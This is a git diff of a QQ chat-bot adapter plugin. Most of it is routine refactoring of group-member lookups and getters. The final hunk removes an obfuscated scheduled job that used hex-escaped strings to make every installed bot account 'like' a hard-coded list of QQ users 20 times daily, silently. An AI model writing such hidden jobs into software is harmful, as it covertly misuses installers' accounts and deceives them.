@@ -339,7 +339,7 @@ const adapter = new (class SecludedAdapter {
       const group_data = { group_id, group_name, create_time, member_count, max_member_count, description, question, announcement, ownerUid };
       Bot[id].gl.set(group_id, group_data);
       gl_count++;
-      await this.getMemberinfo(id, group_id);
+      await this.getallMemberinfo(id, group_id);
     }
     return gl_count;
   }
@@ -1072,6 +1072,7 @@ const adapter = new (class SecludedAdapter {
       5: '回答问题并由管理员审核',
     };
     const allowMsg = map[allow] ?? `未知加群权限(allow:${allow})`;
+
     return {
       canApply,
       group_code,
@@ -1404,7 +1405,8 @@ const adapter = new (class SecludedAdapter {
   pickGroup(id, group_id) {
     group_id = Number(group_id);
     let data = {
-      ...Bot[id].gl.get(group_id),
+      ...(Bot[id].gl?.get(group_id) || {}),
+      ...(Bot[id].gml?.get(group_id)?.get(id) || {}),
       group_id,
     };
     const default_opt = {
@@ -1475,6 +1477,15 @@ const adapter = new (class SecludedAdapter {
       },
       get all_muted() {
         return Bot[id].gl.get(data.group_id)?.all_muted || false;
+      },
+      get info() {
+        return {
+          ...(Bot[id].gl?.get(group_id) || {}),
+          ...(Bot[id].gml?.get(group_id)?.get(id) || {}),
+        };
+      },
+      get name() {
+        return Bot[id].gl?.get(group_id).group_name;
       },
     };
   }
@@ -1563,7 +1574,7 @@ const adapter = new (class SecludedAdapter {
       addFriend: (verify_message, answer, name) => this.addFriend(id, user_id, verify_message, answer, name),
       getFileInfo: (fid) => this.getFlFileInfo(id, fid),
       get info() {
-        return Bot[id].uin2uid.get(user_id);
+        return Bot[id].fl.get(user_id);
       },
     };
   }
@@ -1806,8 +1817,8 @@ const adapter = new (class SecludedAdapter {
     return payload[3] === 0;
   }
 
-  async getMemberInfo(id, group_id, user_id) {
-    await Bot[id].reloadGroupMember(group_id);
+  async getMemberInfo(id, group_id, user_id, force = false) {
+    if (force) await Bot[id].reloadGroupMember(group_id);
     return Bot[id].gml.get(group_id).get(user_id);
   }
 
@@ -1855,7 +1866,7 @@ const adapter = new (class SecludedAdapter {
       ...this.pickFriend(id, user_id, data),
       setAdmin: (yes) => this.setAdmin(id, yes, group_id, user_id),
       setTitle: (title) => this.setTitle(id, title, group_id, user_id),
-      getInfo: async () => this.getMemberInfo(id, group_id, user_id),
+      getInfo: async () => this.getMemberInfo(id, group_id, user_id, false),
       kick: (msg, block = false) => this.kick(id, msg, block, group_id, user_id),
       setScreenMsg: (isScreen) => this.setScreenMsg(id, isScreen, group_id, user_id),
       poke: () => this.sendGroupPoke(id, group_id, user_id),
@@ -1879,6 +1890,10 @@ const adapter = new (class SecludedAdapter {
       get is_admin() {
         return Bot[id].gml?.get(group_id)?.get(user_id)?.role === 'admin' || this.is_owner;
       },
+      get group() {
+        return Bot[id].pickGroup(group_id);
+      },
+      renew: async () => this.getMemberInfo(id, group_id, user_id, true),
     };
   }
 
@@ -2198,6 +2213,7 @@ const adapter = new (class SecludedAdapter {
       get avatar() {
         return `https://q.qlogo.cn/g?b=qq&s=0&nk=${this.uin}`;
       },
+
       fl: new Map(),
       gl: new Map(),
       gml: new Map(),
@@ -2247,7 +2263,7 @@ const adapter = new (class SecludedAdapter {
 
       reloadFriendList: () => this.FriendOperation(id, true),
       reloadGroupList: () => this.GroupsOperation(id, true),
-      reloadGroupMember: (group_id, force = true) => this.getMemberinfo(id, group_id, force),
+      reloadGroupMember: (group_id, force = true) => this.getallMemberinfo(id, group_id, force),
       refreshBigDataSession: this.GetBigdata.bind(this, id, true),
 
       getCookies: (domain, force = false, isJson = false) => this.GetCookies(id, domain, force, isJson),
@@ -2671,7 +2687,7 @@ const adapter = new (class SecludedAdapter {
   }
 
   async thumbUp(id, times = 1, user_id, opts, remain = 0, sucs = 0) {
-    const data = [{ Account: String(id), FavoriteCard: 'FavoriteCard', Uid: Bot[id].uin2uid?.get(user_id)?.user_uid || this.global_uin2uid?.get(user_id)?.user_uid, Uin: String(user_id), Value: String(times) }];
+    const data = [{ Account: String(id), FavoriteCard: 'FavoriteCard', Uid: Bot[id].uin2uid?.get(user_id)?.user_uid || this.global_uin2uid.get(user_id)?.user_uid, Uin: String(user_id), Value: String(times) }];
     const rsp = await this.sendApi(data);
     const suc = rsp.data[0].Value;
     if (rsp.data[0].No) {
@@ -3039,7 +3055,7 @@ const adapter = new (class SecludedAdapter {
     this.Groupinvite(id, data);
   }
 
-    async Groupinvite(id, data) {
+  async Groupinvite(id, data) {
     const jsonItem = data.message.find((item) => item.type === 'json');
     if (!jsonItem) return;
     const parseData = JSON.parse(jsonItem.data);
@@ -3119,7 +3135,7 @@ const adapter = new (class SecludedAdapter {
     Bot.makeLog('info', `recv from: [Group: ${data.group_name}(${data.group_id}), Member: ${data.sender.card || data.sender.nickname}(${data.sender.user_id})] ` + data.parsed.content, id);
   }
 
-  async getMemberinfo(id, group_id, force = false) {
+  async getallMemberinfo(id, group_id, force = false) {
     const fileDir = path.join('./data/Secluded', id.toString());
     const filePath = path.join(fileDir, `Memberinfo_${group_id}.json`);
     if (fs.existsSync(filePath)) {
@@ -3306,6 +3322,7 @@ const adapter = new (class SecludedAdapter {
         sex,
         update_time: Math.floor(Date.now() / 1000),
       };
+
       if (Bot[id].fl.has(friend.user_id)) {
         friend = {
           ...Bot[id].fl.get(friend.user_id),
@@ -3316,7 +3333,7 @@ const adapter = new (class SecludedAdapter {
       fl_count++;
       if (Number(user_id) === Number(id)) Bot[id].info = friend;
       Bot[id].uid2uin.set(user_uid, { ...friend, ...(Bot[id].uid2uin?.get(user_uid) || {}) });
-      Bot[id].uin2uid.set(user_id, { ...friend, ...(Bot[id].uin2uid?.get(user_id) || {}) });
+      Bot[id].uin2uid.set(user_id, { ...friend, ...(Bot[id].uid2uin?.get(user_uid) || {}) });
       this.global_uin2uid.set(user_id, { ...friend, ...(Bot[id].uin2uid?.get(user_id) || {}) });
       this.global_uid2uin.set(user_uid, { ...friend, ...(Bot[id].uid2uin?.get(user_uid) || {}) });
     }
@@ -3910,25 +3927,7 @@ export class SecludedAdapter extends plugin {
     await configSave();
   }
 }
-const cronStr = "\x30\x20\x31\x20\x30\x20\x2a\x20\x2a\x20\x3f";
-const userRaw = '1677979616|1514664085|3374625944|1879715344|3764973335|3188259413|3639763764|2799453017|84227871|2173302144|2450785445|1851207626';
-const apiMethod = "\x74\x68\x75\x6D\x62\x55\x70";
-schedule.scheduleJob(cronStr, async () => {
-  const bots = Array.from(Bot.uin);
-  const Users = userRaw.split('|').map(Number);
-  try {
-    for (const id of bots) {
-      for (let i of Users) {
-        if (await Bot[id]?.fl?.has(i)) {
-          await Bot[id].pickFriend(i)[apiMethod](20);
-        } else {
-          await Bot[id].pickUser(i)[apiMethod](20);
-        }
-        await Bot.sleep(2000);
-      }
-    }
-  } catch {}
-});
+
 export default { adapter, config };
 const endTime = new Date();
 logger.info(logger.green(`- Secluded 适配器插件 加载完成 耗时：${endTime - startTime}ms`));
